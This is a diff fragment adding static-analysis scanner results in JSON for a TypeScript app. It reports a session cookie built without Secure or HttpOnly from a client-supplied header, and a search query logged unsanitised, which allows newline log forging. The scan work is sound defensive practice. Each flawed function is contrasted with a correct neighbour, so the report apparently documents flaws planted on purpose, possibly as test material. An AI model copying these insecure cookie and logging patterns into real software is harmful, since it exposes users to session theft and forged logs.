+        "message": "pinWorkspaceContext() builds the workspace_ctx Set-Cookie header by hand with neither Secure nor HttpOnly flags, and its value is derived from the caller-controlled x-session-id request header rather than being exclusively server-minted \u2014 contrast pinRecentClient() which uses a properly configured createCookie serializer on the lines below.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.logging.log-injection",
+      "path": "app/activity.server.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 469
+      },
+      "end": {
+        "line": 12,
+        "col": 77,
+        "offset": 546
+      },
+      "extra": {
+        "message": "recordSearchActivity() writes the raw search query into the process log without stripping CR/LF/NUL \u2014 contrast recordFilterActivity() on the very next lines which sanitizes filterText before logging. The ?q= parameter on the matters list (app/routes/app.matters._index.tsx:53) can therefore forge log entries via newline injection.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
